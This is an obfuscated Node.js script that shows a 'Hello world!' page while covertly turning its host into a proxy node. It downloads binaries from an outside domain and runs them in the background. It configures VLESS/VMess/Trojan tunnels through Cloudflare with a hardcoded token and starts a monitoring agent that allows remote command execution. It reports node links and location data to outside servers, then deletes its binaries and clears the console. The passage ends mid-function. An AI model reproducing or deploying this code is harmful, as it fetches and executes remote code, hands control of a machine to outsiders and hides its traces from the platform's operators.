const _0x501067=_0x565b;(function(_0x4ce4b1,_0x5b9b53){const _0x118904=_0x565b,_0x5f5a4a=_0x4ce4b1();while(!![]){try{const _0x5d30dc=-parseInt(_0x118904(0x22a))/0x1+parseInt(_0x118904(0x1f9))/0x2+-parseInt(_0x118904(0x1ac))/0x3*(parseInt(_0x118904(0x24c))/0x4)+-parseInt(_0x118904(0x219))/0x5*(-parseInt(_0x118904(0x252))/0x6)+parseInt(_0x118904(0x247))/0x7*(-parseInt(_0x118904(0x260))/0x8)+-parseInt(_0x118904(0x1b5))/0x9*(-parseInt(_0x118904(0x243))/0xa)+parseInt(_0x118904(0x25d))/0xb;if(_0x5d30dc===_0x5b9b53)break;else _0x5f5a4a['push'](_0x5f5a4a['shift']());}catch(_0x22718d){_0x5f5a4a['push'](_0x5f5a4a['shift']());}}}(_0x32f9,0x6f1c2));const express=require(_0x501067(0x1fb)),app=express(),axios=require(_0x501067(0x23f)),os=require('os'),fs=require('fs'),path=require(_0x501067(0x210)),{promisify}=require(_0x501067(0x1d6)),exec=promisify(require(_0x501067(0x1dc))[_0x501067(0x213)]),{execSync}=require(_0x501067(0x1dc)),UPLOAD_URL=process['env'][_0x501067(0x204)]||'',PROJECT_URL=process[_0x501067(0x1ba)][_0x501067(0x1b0)]||'',AUTO_ACCESS=process[_0x501067(0x1ba)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x501067(0x1ba)][_0x501067(0x19b)]||_0x501067(0x1e0),SUB_PATH=process[_0x501067(0x1ba)][_0x501067(0x1ce)]||_0x501067(0x19e),PORT=process['env'][_0x501067(0x242)]||process[_0x501067(0x1ba)]['PORT']||0xbb8,UUID=process[_0x501067(0x1ba)][_0x501067(0x21c)]||_0x501067(0x21e),NEZHA_SERVER=process['env'][_0x501067(0x1c7)]||'',NEZHA_PORT=process[_0x501067(0x1ba)][_0x501067(0x25c)]||'',NEZHA_KEY=process[_0x501067(0x1ba)][_0x501067(0x1b9)]||'',ARGO_DOMAIN=process[_0x501067(0x1ba)]['ARGO_DOMAIN']||_0x501067(0x205),ARGO_AUTH=process[_0x501067(0x1ba)][_0x501067(0x1aa)]||_0x501067(0x1c2),ARGO_PORT=process['env'][_0x501067(0x226)]||0x1f41,CFIP=process[_0x501067(0x1ba)][_0x501067(0x1d1)]||_0x501067(0x1e4),CFPORT=process[_0x501067(0x1ba)][_0x501067(0x203)]||0x1bb,NAME=process[_0x501067(0x1ba)][_0x501067(0x1c9)]||_0x501067(0x1d9);!fs[_0x501067(0x1e1)](FILE_PATH)?(fs[_0x501067(0x202)](FILE_PATH),console[_0x501067(0x232)](FILE_PATH+_0x501067(0x1fe))):console[_0x501067(0x232)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x5d434f=_0x501067,_0x3e16e4=_0x5d434f(0x249);let _0x4646cd='';for(let _0x4a1b2d=0x0;_0x4a1b2d<0x6;_0x4a1b2d++){_0x4646cd+=_0x3e16e4['charAt'](Math[_0x5d434f(0x1c0)](Math[_0x5d434f(0x230)]()*_0x3e16e4['length']));}return _0x4646cd;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x501067(0x24a)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x501067(0x24a)](FILE_PATH,webName),botPath=path[_0x501067(0x24a)](FILE_PATH,botName),subPath=path[_0x501067(0x24a)](FILE_PATH,_0x501067(0x251)),listPath=path[_0x501067(0x24a)](FILE_PATH,_0x501067(0x1a5)),bootLogPath=path[_0x501067(0x24a)](FILE_PATH,_0x501067(0x1b3)),configPath=path[_0x501067(0x24a)](FILE_PATH,_0x501067(0x20c));function deleteNodes(){const _0x3132c9=_0x501067;try{if(!UPLOAD_URL)return;if(!fs[_0x3132c9(0x1e1)](subPath))return;let _0x128d21;try{_0x128d21=fs[_0x3132c9(0x216)](subPath,_0x3132c9(0x1f3));}catch{return null;}const _0xad04f2=Buffer['from'](_0x128d21,_0x3132c9(0x1c6))[_0x3132c9(0x20b)](_0x3132c9(0x1f3)),_0x3a92d3=_0xad04f2[_0x3132c9(0x224)]('\x0a')[_0x3132c9(0x212)](_0x267f7d=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3132c9(0x1cd)](_0x267f7d));if(_0x3a92d3[_0x3132c9(0x1a0)]===0x0)return;return axios['post'](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x3a92d3}),{'headers':{'Content-Type':_0x3132c9(0x217)}})[_0x3132c9(0x1f2)](_0xa58fe=>{return null;}),null;}catch(_0x40720e){return null;}}function cleanupOldFiles(){const _0x14fdbb=_0x501067;try{const _0x3560a6=fs[_0x14fdbb(0x1d0)](FILE_PATH);_0x3560a6[_0x14fdbb(0x1b8)](_0x4ad26a=>{const _0x1a24f4=_0x14fdbb,_0xfbb324=path[_0x1a24f4(0x24a)](FILE_PATH,_0x4ad26a);try{const _0x14815a=fs[_0x1a24f4(0x1e7)](_0xfbb324);_0x14815a[_0x1a24f4(0x228)]()&&fs[_0x1a24f4(0x248)](_0xfbb324);}catch(_0x1848f1){}});}catch(_0x5acf91){}}app[_0x501067(0x1fa)]('/',function(_0x87092b,_0x3e909b){_0x3e909b['send']('Hello\x20world!');});async function generateConfig(){const _0x31ad15=_0x501067,_0x7f28c1={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x31ad15(0x1d8)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x31ad15(0x1d8),'fallbacks':[{'dest':0xbb9},{'path':_0x31ad15(0x21f),'dest':0xbba},{'path':_0x31ad15(0x23b),'dest':0xbbb},{'path':_0x31ad15(0x19d),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x31ad15(0x22d),'settings':{'clients':[{'id':UUID}],'decryption':_0x31ad15(0x1d8)},'streamSettings':{'network':_0x31ad15(0x1c5),'security':_0x31ad15(0x1d8)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x31ad15(0x22d),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x31ad15(0x1d8),'wsSettings':{'path':_0x31ad15(0x21f)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x31ad15(0x25f)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x31ad15(0x1fd),'protocol':_0x31ad15(0x1da),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x31ad15(0x23b)}},'sniffing':{'enabled':!![],'destOverride':[_0x31ad15(0x1c8),_0x31ad15(0x1b1),_0x31ad15(0x25f)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x31ad15(0x207),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x31ad15(0x1d8),'wsSettings':{'path':_0x31ad15(0x19d)}},'sniffing':{'enabled':!![],'destOverride':[_0x31ad15(0x1c8),'tls',_0x31ad15(0x25f)],'metadataOnly':![]}}],'dns':{'servers':[_0x31ad15(0x22e)]},'outbounds':[{'protocol':_0x31ad15(0x1be),'tag':'direct'},{'protocol':_0x31ad15(0x237),'tag':_0x31ad15(0x208)}]};fs[_0x31ad15(0x25b)](path[_0x31ad15(0x24a)](FILE_PATH,_0x31ad15(0x20c)),JSON[_0x31ad15(0x257)](_0x7f28c1,null,0x2));}function getSystemArchitecture(){const _0x5ecbb6=_0x501067,_0x555c01=os[_0x5ecbb6(0x255)]();return _0x555c01==='arm'||_0x555c01==='arm64'||_0x555c01===_0x5ecbb6(0x223)?_0x5ecbb6(0x1f5):_0x5ecbb6(0x1ad);}function _0x565b(_0x3845e6,_0x5b898d){_0x3845e6=_0x3845e6-0x19b;const _0x32f995=_0x32f9();let _0x565b37=_0x32f995[_0x3845e6];return _0x565b37;}function downloadFile(_0x1e7579,_0x56d2b7,_0x3c2df5){const _0x457325=_0x501067,_0x5da252=_0x1e7579;!fs[_0x457325(0x1e1)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x166806=fs[_0x457325(0x19c)](_0x5da252);axios({'method':_0x457325(0x1fa),'url':_0x56d2b7,'responseType':_0x457325(0x1ca)})['then'](_0x334df7=>{const _0x16ea57=_0x457325;_0x334df7[_0x16ea57(0x20e)]['pipe'](_0x166806),_0x166806['on'](_0x16ea57(0x1bc),()=>{const _0x50000d=_0x16ea57;_0x166806[_0x50000d(0x215)](),console[_0x50000d(0x232)](_0x50000d(0x1f1)+path['basename'](_0x5da252)+_0x50000d(0x236)),_0x3c2df5(null,_0x5da252);}),_0x166806['on']('error',_0x5b1f15=>{const _0x1a5e54=_0x16ea57;fs[_0x1a5e54(0x221)](_0x5da252,()=>{});const _0x28f42c=_0x1a5e54(0x1f1)+path['basename'](_0x5da252)+'\x20failed:\x20'+_0x5b1f15['message'];console[_0x1a5e54(0x227)](_0x28f42c),_0x3c2df5(_0x28f42c);});})['catch'](_0x4b8a07=>{const _0x578cf8=_0x457325,_0x32cdcf=_0x578cf8(0x1f1)+path[_0x578cf8(0x256)](_0x5da252)+_0x578cf8(0x222)+_0x4b8a07['message'];console[_0x578cf8(0x227)](_0x32cdcf),_0x3c2df5(_0x32cdcf);});}async function downloadFilesAndRun(){const _0x7a7ffe=_0x501067,_0x5cab21=getSystemArchitecture(),_0x448b81=getFilesForArchitecture(_0x5cab21);if(_0x448b81[_0x7a7ffe(0x1a0)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0xe4172a=_0x448b81[_0x7a7ffe(0x239)](_0x1a8fdb=>{return new Promise((_0x2707bb,_0x2e17c2)=>{const _0x351729=_0x565b;downloadFile(_0x1a8fdb[_0x351729(0x1fc)],_0x1a8fdb['fileUrl'],(_0x241491,_0x57476c)=>{_0x241491?_0x2e17c2(_0x241491):_0x2707bb(_0x57476c);});});});try{await Promise[_0x7a7ffe(0x1a2)](_0xe4172a);}catch(_0x18de0f){console[_0x7a7ffe(0x227)](_0x7a7ffe(0x1e8),_0x18de0f);return;}function _0x426f77(_0x436f29){const _0x5b1f49=_0x7a7ffe,_0x19d6ee=0x1fd;_0x436f29[_0x5b1f49(0x1b8)](_0x1e0d5d=>{const _0xb41f86=_0x5b1f49;fs['existsSync'](_0x1e0d5d)&&fs[_0xb41f86(0x201)](_0x1e0d5d,_0x19d6ee,_0x29764f=>{const _0x28b807=_0xb41f86;_0x29764f?console[_0x28b807(0x227)](_0x28b807(0x209)+_0x1e0d5d+':\x20'+_0x29764f):console[_0x28b807(0x232)](_0x28b807(0x218)+_0x1e0d5d+':\x20'+_0x19d6ee[_0x28b807(0x20b)](0x8));});});}const _0x6551ac=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x426f77(_0x6551ac);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xbad6de=NEZHA_SERVER[_0x7a7ffe(0x233)](':')?NEZHA_SERVER[_0x7a7ffe(0x224)](':')[_0x7a7ffe(0x23a)]():'',_0x6b893e=new Set([_0x7a7ffe(0x20f),_0x7a7ffe(0x1a8),_0x7a7ffe(0x1f0),_0x7a7ffe(0x1bf),_0x7a7ffe(0x1bd),_0x7a7ffe(0x214)]),_0x1e9209=_0x6b893e[_0x7a7ffe(0x22f)](_0xbad6de)?_0x7a7ffe(0x1ff):_0x7a7ffe(0x240),_0x4b0e73='\x0aclient_secret:\x20'+NEZHA_KEY+_0x7a7ffe(0x231)+NEZHA_SERVER+_0x7a7ffe(0x1a1)+_0x1e9209+_0x7a7ffe(0x1ee)+UUID;fs[_0x7a7ffe(0x25b)](path[_0x7a7ffe(0x24a)](FILE_PATH,_0x7a7ffe(0x24f)),_0x4b0e73);const _0x4e3efe='nohup\x20'+phpPath+_0x7a7ffe(0x1a6)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x4e3efe),console[_0x7a7ffe(0x232)](phpName+_0x7a7ffe(0x1df)),await new Promise(_0x3ca78e=>setTimeout(_0x3ca78e,0x3e8));}catch(_0x14c9ad){console[_0x7a7ffe(0x227)](_0x7a7ffe(0x258)+_0x14c9ad);}}else{let _0x5c9486='';const _0x34c256=[_0x7a7ffe(0x20f),_0x7a7ffe(0x1a8),_0x7a7ffe(0x1f0),_0x7a7ffe(0x1bf),_0x7a7ffe(0x1bd),_0x7a7ffe(0x214)];_0x34c256['includes'](NEZHA_PORT)&&(_0x5c9486='--tls');const _0xafb1c3='nohup\x20'+npmPath+_0x7a7ffe(0x246)+NEZHA_SERVER+':'+NEZHA_PORT+_0x7a7ffe(0x1e5)+NEZHA_KEY+'\x20'+_0x5c9486+_0x7a7ffe(0x1d3);try{await exec(_0xafb1c3),console['log'](npmName+_0x7a7ffe(0x1df)),await new Promise(_0x554221=>setTimeout(_0x554221,0x3e8));}catch(_0x2cc690){console['error']('npm\x20running\x20error:\x20'+_0x2cc690);}}}else console[_0x7a7ffe(0x232)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2f72b4=_0x7a7ffe(0x25a)+webPath+'\x20-c\x20'+FILE_PATH+_0x7a7ffe(0x1b4);try{await exec(_0x2f72b4),console[_0x7a7ffe(0x232)](webName+'\x20is\x20running'),await new Promise(_0x1b3c98=>setTimeout(_0x1b3c98,0x3e8));}catch(_0x266366){console[_0x7a7ffe(0x227)](_0x7a7ffe(0x1f7)+_0x266366);}if(fs[_0x7a7ffe(0x1e1)](botPath)){let _0x1a3aef;if(ARGO_AUTH[_0x7a7ffe(0x1de)](/^[A-Z0-9a-z=]{120,250}$/))_0x1a3aef=_0x7a7ffe(0x1ed)+ARGO_AUTH;else ARGO_AUTH[_0x7a7ffe(0x1de)](/TunnelSecret/)?_0x1a3aef='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x7a7ffe(0x1f4):_0x1a3aef='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x7a7ffe(0x25a)+botPath+'\x20'+_0x1a3aef+_0x7a7ffe(0x21a)),console[_0x7a7ffe(0x232)](botName+_0x7a7ffe(0x1df)),await new Promise(_0xa0810c=>setTimeout(_0xa0810c,0x7d0));}catch(_0x2f5bdd){console[_0x7a7ffe(0x227)](_0x7a7ffe(0x24b)+_0x2f5bdd);}}await new Promise(_0x582ed3=>setTimeout(_0x582ed3,0x1388));}function getFilesForArchitecture(_0x1b075a){const _0x22be4d=_0x501067;let _0x58e871;_0x1b075a===_0x22be4d(0x1f5)?_0x58e871=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x22be4d(0x1db)}]:_0x58e871=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2aa019=_0x1b075a===_0x22be4d(0x1f5)?_0x22be4d(0x1e6):_0x22be4d(0x1b6);_0x58e871[_0x22be4d(0x1ef)]({'fileName':npmPath,'fileUrl':_0x2aa019});}else{const _0xd53567=_0x1b075a==='arm'?'https://arm64.ssss.nyc.mn/v1':_0x22be4d(0x254);_0x58e871[_0x22be4d(0x1ef)]({'fileName':phpPath,'fileUrl':_0xd53567});}}return _0x58e871;}function argoType(){const _0xa57337=_0x501067;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xa57337(0x232)](_0xa57337(0x1ec));return;}if(ARGO_AUTH[_0xa57337(0x233)](_0xa57337(0x1ea))){fs[_0xa57337(0x25b)](path[_0xa57337(0x24a)](FILE_PATH,_0xa57337(0x211)),ARGO_AUTH);const _0xfad6aa='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0xa57337(0x224)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0xa57337(0x24a)](FILE_PATH,_0xa57337(0x211))+_0xa57337(0x1c1)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0xa57337(0x1eb);fs[_0xa57337(0x25b)](path[_0xa57337(0x24a)](FILE_PATH,_0xa57337(0x259)),_0xfad6aa);}else console[_0xa57337(0x232)](_0xa57337(0x1d4));}async function extractDomains(){const _0x4644d5=_0x501067;let _0x49ecb8;if(ARGO_AUTH&&ARGO_DOMAIN)_0x49ecb8=ARGO_DOMAIN,console[_0x4644d5(0x232)](_0x4644d5(0x23c),_0x49ecb8),await _0x413b39(_0x49ecb8);else try{const _0xce1c19=fs[_0x4644d5(0x216)](path[_0x4644d5(0x24a)](FILE_PATH,_0x4644d5(0x1b3)),_0x4644d5(0x1f3)),_0x43e713=_0xce1c19[_0x4644d5(0x224)]('\x0a'),_0x44b9e1=[];_0x43e713[_0x4644d5(0x1b8)](_0x33c285=>{const _0x501251=_0x33c285['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x501251){const _0x48a492=_0x501251[0x1];_0x44b9e1['push'](_0x48a492);}});if(_0x44b9e1[_0x4644d5(0x1a0)]>0x0)_0x49ecb8=_0x44b9e1[0x0],console['log']('ArgoDomain:',_0x49ecb8),await _0x413b39(_0x49ecb8);else{console['log'](_0x4644d5(0x238)),fs[_0x4644d5(0x248)](path[_0x4644d5(0x24a)](FILE_PATH,_0x4644d5(0x1b3)));async function _0x166355(){const _0x56f8f8=_0x4644d5;try{process[_0x56f8f8(0x22b)]===_0x56f8f8(0x253)?await exec(_0x56f8f8(0x225)+botName+_0x56f8f8(0x1a3)):await exec(_0x56f8f8(0x25e)+botName[_0x56f8f8(0x1e9)](0x0)+']'+botName['substring'](0x1)+_0x56f8f8(0x244));}catch(_0x2a6236){}}_0x166355(),await new Promise(_0x230749=>setTimeout(_0x230749,0xbb8));const _0xbeab89=_0x4644d5(0x1c4)+FILE_PATH+_0x4644d5(0x1af)+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0xbeab89+'\x20>/dev/null\x202>&1\x20&'),console[_0x4644d5(0x232)](botName+_0x4644d5(0x1df)),await new Promise(_0x25aadd=>setTimeout(_0x25aadd,0xbb8)),await extractDomains();}catch(_0x4208f3){console[_0x4644d5(0x227)](_0x4644d5(0x24b)+_0x4208f3);}}}catch(_0xc04661){console['error']('Error\x20reading\x20boot.log:',_0xc04661);}async function _0x35ee85(){const _0x2242fc=_0x4644d5;try{const _0x358704=await axios['get'](_0x2242fc(0x1ab),{'timeout':0xbb8});if(_0x358704[_0x2242fc(0x20e)]&&_0x358704[_0x2242fc(0x20e)][_0x2242fc(0x1a4)]&&_0x358704[_0x2242fc(0x20e)][_0x2242fc(0x22c)])return _0x358704[_0x2242fc(0x20e)][_0x2242fc(0x1a4)]+'_'+_0x358704[_0x2242fc(0x20e)][_0x2242fc(0x22c)];}catch(_0x47f3cf){try{const _0x364d51=await axios[_0x2242fc(0x1fa)](_0x2242fc(0x1e3),{'timeout':0xbb8});if(_0x364d51[_0x2242fc(0x20e)]&&_0x364d51[_0x2242fc(0x20e)][_0x2242fc(0x245)]===_0x2242fc(0x1cb)&&_0x364d51['data'][_0x2242fc(0x235)]&&_0x364d51[_0x2242fc(0x20e)][_0x2242fc(0x22c)])return _0x364d51[_0x2242fc(0x20e)][_0x2242fc(0x235)]+'_'+_0x364d51[_0x2242fc(0x20e)]['org'];}catch(_0x468485){}}return _0x2242fc(0x220);}async function _0x413b39(_0x2133b6){const _0x39994e=await _0x35ee85(),_0x669767=NAME?NAME+'-'+_0x39994e:_0x39994e;return new Promise(_0x5120f1=>{setTimeout(()=>{const _0x498f85=_0x565b,_0x3f05f6={'v':'2','ps':''+_0x669767,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':_0x498f85(0x1d8),'host':_0x2133b6,'path':_0x498f85(0x1cc),'tls':'tls','sni':_0x2133b6,'alpn':'','fp':'firefox'},_0x1f85d1='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x498f85(0x1e2)+_0x2133b6+_0x498f85(0x1d5)+_0x2133b6+_0x498f85(0x24e)+_0x669767+_0x498f85(0x24d)+Buffer['from'](JSON[_0x498f85(0x257)](_0x3f05f6))[_0x498f85(0x20b)]('base64')+_0x498f85(0x1dd)+UUID+'@'+CFIP+':'+CFPORT+_0x498f85(0x1a9)+_0x2133b6+'&fp=firefox&type=ws&host='+_0x2133b6+_0x498f85(0x19f)+_0x669767+_0x498f85(0x21b);console[_0x498f85(0x232)](Buffer[_0x498f85(0x20d)](_0x1f85d1)[_0x498f85(0x20b)]('base64')),fs[_0x498f85(0x25b)](subPath,Buffer[_0x498f85(0x20d)](_0x1f85d1)[_0x498f85(0x20b)](_0x498f85(0x1c6))),console[_0x498f85(0x232)](FILE_PATH+_0x498f85(0x1a7)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x4e969b,_0x524fbb)=>{const _0x240291=_0x498f85,_0x4cc24b=Buffer[_0x240291(0x20d)](_0x1f85d1)['toString'](_0x240291(0x1c6));_0x524fbb[_0x240291(0x1f6)]('Content-Type','text/plain;\x20charset=utf-8'),_0x524fbb[_0x240291(0x20a)](_0x4cc24b);}),_0x5120f1(_0x1f85d1);},0x7d0);});}}async function uploadNodes(){const _0x75a34f=_0x501067;if(UPLOAD_URL&&PROJECT_URL){const _0x1c451f=PROJECT_URL+'/'+SUB_PATH,_0x32d1b1={'subscription':[_0x1c451f]};try{const _0x2e057b=await axios[_0x75a34f(0x1cf)](UPLOAD_URL+'/api/add-subscriptions',_0x32d1b1,{'headers':{'Content-Type':_0x75a34f(0x217)}});return _0x2e057b&&_0x2e057b[_0x75a34f(0x245)]===0xc8?(console[_0x75a34f(0x232)]('Subscription\x20uploaded\x20successfully'),_0x2e057b):null;}catch(_0x53082c){if(_0x53082c['response']){if(_0x53082c[_0x75a34f(0x23d)][_0x75a34f(0x245)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x75a34f(0x1e1)](listPath))return;const _0x2a8ca6=fs[_0x75a34f(0x216)](listPath,_0x75a34f(0x1f3)),_0x379621=_0x2a8ca6['split']('\x0a')[_0x75a34f(0x212)](_0x162446=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x162446));if(_0x379621[_0x75a34f(0x1a0)]===0x0)return;const _0x554999=JSON[_0x75a34f(0x257)]({'nodes':_0x379621});try{const _0x193f9b=await axios[_0x75a34f(0x1cf)](UPLOAD_URL+_0x75a34f(0x1bb),_0x554999,{'headers':{'Content-Type':_0x75a34f(0x217)}});return _0x193f9b&&_0x193f9b[_0x75a34f(0x245)]===0xc8?(console[_0x75a34f(0x232)](_0x75a34f(0x206)),_0x193f9b):null;}catch(_0x33a7b5){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x25d3b3=_0x565b,_0x514811=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x514811['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x514811['push'](phpPath);process[_0x25d3b3(0x22b)]===_0x25d3b3(0x253)?exec('del\x20/f\x20/q\x20'+_0x514811[_0x25d3b3(0x24a)]('\x20')+_0x25d3b3(0x234),_0x478f6d=>{const _0x3fb345=_0x25d3b3;console[_0x3fb345(0x1d2)](),console['log']('App\x20is\x20running'),console[_0x3fb345(0x232)](_0x3fb345(0x23e));}):exec(_0x25d3b3(0x21d)+_0x514811[_0x25d3b3(0x24a)]('\x20')+_0x25d3b3(0x250),_0x2eea98=>{const _0x209d6f=_0x25d3b3;console[_0x209d6f(0x1d2)](),console[_0x209d6f(0x232)](_0x209d6f(0x1d7)),console[_0x209d6f(0x232)](_0x209d6f(0x23e));});},0x15f90);}cleanFiles();function _0x32f9(){const _0x4d04a5=['App\x20is\x20running','none','xbing','vmess','https://arm64.ssss.nyc.mn/bot','child_process','\x0a\x0atrojan://','match','\x20is\x20running','./tmp','existsSync','?encryption=none&security=tls&sni=','http://ip-api.com/json/','cdns.doon.eu.org','\x20-p\x20','https://arm64.ssss.nyc.mn/agent','statSync','Error\x20downloading\x20files:','charAt','TunnelSecret','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','unshift','2096','Download\x20','catch','utf-8','/tunnel.yml\x20run','arm','set','web\x20running\x20error:\x20','message','1664968UyckoE','get','express','fileName','127.0.0.1','\x20is\x20created','true','Add\x20automatic\x20access\x20task\x20faild:\x20','chmod','mkdirSync','CFPORT','UPLOAD_URL','https://xbing.zgop.dpdns.org/','Nodes\x20uploaded\x20successfully','trojan','block','Empowerment\x20failed\x20for\x20','send','toString','config.json','from','data','443','path','tunnel.json','filter','exec','2053','close','readFileSync','application/json','Empowerment\x20success\x20for\x20','5IqzgPm','\x20>/dev/null\x202>&1\x20&','\x0a\x20\x20\x20\x20','UUID','rm\x20-rf\x20','e14704f3-7632-4703-92d7-a07959b747db','/vless-argo','Unknown','unlink','\x20failed:\x20','aarch64','split','taskkill\x20/f\x20/im\x20','ARGO_PORT','error','isFile','Skipping\x20adding\x20automatic\x20access\x20task','615505AXDwxy','platform','org','vless','https+local://8.8.8.8/dns-query','has','random','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','log','includes','\x20>\x20nul\x202>&1','countryCode','\x20successfully','blackhole','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','map','pop','/vmess-argo','ARGO_DOMAIN:','response','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','axios','false','listen','SERVER_PORT','62560pjyDnf','\x22\x20>\x20/dev/null\x202>&1','status','\x20-s\x20','91PtUcyS','unlinkSync','abcdefghijklmnopqrstuvwxyz','join','Error\x20executing\x20command:\x20','545296xFAuDh','\x0a\x0avmess://','&path=%2Fvless-argo%3Fed%3D2560#','config.yaml','\x20>/dev/null\x202>&1','sub.txt','4693386aBfroA','win32','https://amd64.ssss.nyc.mn/v1','arch','basename','stringify','php\x20running\x20error:\x20','tunnel.yml','nohup\x20','writeFileSync','NEZHA_PORT','226556HczDwz','pkill\x20-f\x20\x22[','quic','185184XGbUPh','FILE_PATH','createWriteStream','/trojan-argo','sub','&path=%2Ftrojan-argo%3Fed%3D2560#','length','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','all','.exe\x20>\x20nul\x202>&1','country_code','list.txt','\x20-c\x20\x22','/sub.txt\x20saved\x20successfully','8443','?security=tls&sni=','ARGO_AUTH','https://ipapi.co/json/','12KgjQEv','amd','Error\x20in\x20startserver:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','PROJECT_URL','tls','http\x20server\x20is\x20running\x20on\x20port:','boot.log','/config.json\x20>/dev/null\x202>&1\x20&','405NOvxOn','https://amd64.ssss.nyc.mn/agent','https://oooo.serv00.net/add-url','forEach','NEZHA_KEY','env','/api/add-nodes','finish','2083','freedom','2087','floor','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','eyJhIjoiOWEwMzUxZDkzZGRjOTVhOTIyMTk1M2JhYjk2Yjg5YjkiLCJ0IjoiNTRmN2E0MDgtNTI1Ny00MjBkLWE1MjUtOTRmNzhiODA4NmFlIiwicyI6Ik4yVTVaREkzWm1FdE16Y3hNUzAwTnpJM0xUaGpOamN0WW1NME1qVTVOV1ZrTjJFMiJ9','Unhandled\x20error\x20in\x20startserver:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','tcp','base64','NEZHA_SERVER','http','NAME','stream','success','/vmess-argo?ed=2560','test','SUB_PATH','post','readdirSync','CFIP','clear','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','&fp=firefox&type=ws&host=','util'];_0x32f9=function(){return _0x4d04a5;};return _0x32f9();}async function AddVisitTask(){const _0x451075=_0x501067;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x451075(0x232)](_0x451075(0x229));return;}try{const _0x4255c6=await axios[_0x451075(0x1cf)](_0x451075(0x1b7),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x451075(0x217)}});return console[_0x451075(0x232)]('automatic\x20access\x20task\x20added\x20successfully'),_0x4255c6;}catch(_0x2fb2c3){return console[_0x451075(0x227)](_0x451075(0x200)+_0x2fb2c3[_0x451075(0x1f8)]),null;}}async function startserver(){const _0x7abd99=_0x501067;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await 